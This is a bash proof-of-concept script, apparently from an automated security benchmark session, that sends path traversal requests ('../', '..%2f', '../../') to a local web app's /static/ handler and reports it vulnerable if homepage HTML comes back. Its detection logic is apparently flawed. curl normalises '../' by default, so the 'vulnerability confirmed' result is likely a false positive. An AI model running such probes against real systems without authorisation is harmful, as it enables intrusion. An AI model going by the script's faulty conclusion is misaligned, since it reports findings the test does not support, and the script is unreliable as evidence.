#!/bin/bash
# POC: Demonstrates path traversal vulnerability in static file handler. Tests that /static/../ successfully escapes the static directory and returns content from the parent directory (homepage).
# Target: ./repo
# Created: 2025-12-01T15:54:07.589Z
# Session: benchmark-XBEN-056-24-minbd206

# Path Traversal in Static File Handler POC
# Tests whether the /static/ handler is vulnerable to directory escape via ../

TARGET_URL="http://localhost:8081"

echo "=================================="
echo "Path Traversal in Static File Handler POC"
echo "=================================="
echo ""

# Test 1: Normal static file request (baseline)
echo "[*] Test 1: Baseline - Requesting /static/"
RESPONSE1=$(curl -s -w "\nHTTP_STATUS:%{http_code}" "$TARGET_URL/static/")
HTTP_CODE1=$(echo "$RESPONSE1" | grep "HTTP_STATUS" | cut -d: -f2)
BODY1=$(echo "$RESPONSE1" | sed '$d')

echo "HTTP Status: $HTTP_CODE1"
if [[ "$HTTP_CODE1" == "200" ]]; then
    echo "Response contains: $(echo "$BODY1" | head -c 100)..."
fi
echo ""

# Test 2: Path traversal attempt using unencoded ../
echo "[*] Test 2: Path Traversal - Requesting /static/../"
RESPONSE2=$(curl -s -w "\nHTTP_STATUS:%{http_code}" "$TARGET_URL/static/../")
HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP_STATUS" | cut -d: -f2)
BODY2=$(echo "$RESPONSE2" | sed '$d')

echo "HTTP Status: $HTTP_CODE2"
BODY_LENGTH=$(echo "$BODY2" | wc -c)
echo "Response size: $BODY_LENGTH bytes"

# Check if response contains typical homepage indicators
if echo "$BODY2" | grep -qi "Art Gallery\|homepage\|<!DOCTYPE\|<html"; then
    echo "✓ VULNERABLE: Response contains HTML content (likely homepage)"
    echo "Response preview: $(echo "$BODY2" | grep -o "<title>.*</title>" | head -1)"
else
    echo "Response preview: $(echo "$BODY2" | head -c 150)..."
fi
echo ""

# Test 3: Attempt URL-encoded variant
echo "[*] Test 3: URL-encoded variant - Requesting /static/..%2f"
RESPONSE3=$(curl -s -w "\nHTTP_STATUS:%{http_code}" "$TARGET_URL/static/..%2f")
HTTP_CODE3=$(echo "$RESPONSE3" | grep "HTTP_STATUS" | cut -d: -f2)
BODY3=$(echo "$RESPONSE3" | sed '$d')

echo "HTTP Status: $HTTP_CODE3"
echo ""

# Test 4: Deeper traversal attempt
echo "[*] Test 4: Deeper traversal - Requesting /static/../../"
RESPONSE4=$(curl -s -w "\nHTTP_STATUS:%{http_code}" "$TARGET_URL/static/../../")
HTTP_CODE4=$(echo "$RESPONSE4" | grep "HTTP_STATUS" | cut -d: -f2)
BODY4=$(echo "$RESPONSE4" | sed '$d')

echo "HTTP Status: $HTTP_CODE4"
echo ""

# Analysis
echo "=================================="
echo "ANALYSIS"
echo "=================================="
echo ""

if [[ "$HTTP_CODE2" == "200" ]] && echo "$BODY2" | grep -qi "Art Gallery\|homepage\|<!DOCTYPE"; then
    echo "✓ VULNERABILITY CONFIRMED: Path traversal is possible"
    echo "  - /static/../ returns HTTP 200 with homepage content"
    echo "  - Static handler does not properly validate/canonicalize paths"
    echo "  - Attacker can escape the static directory using ../ sequences"
    exit 0
else
    echo "✗ No obvious path traversal detected in basic tests"
    echo "  However, the 200 status on /static/../ may still indicate vulnerability"
    exit 1
fi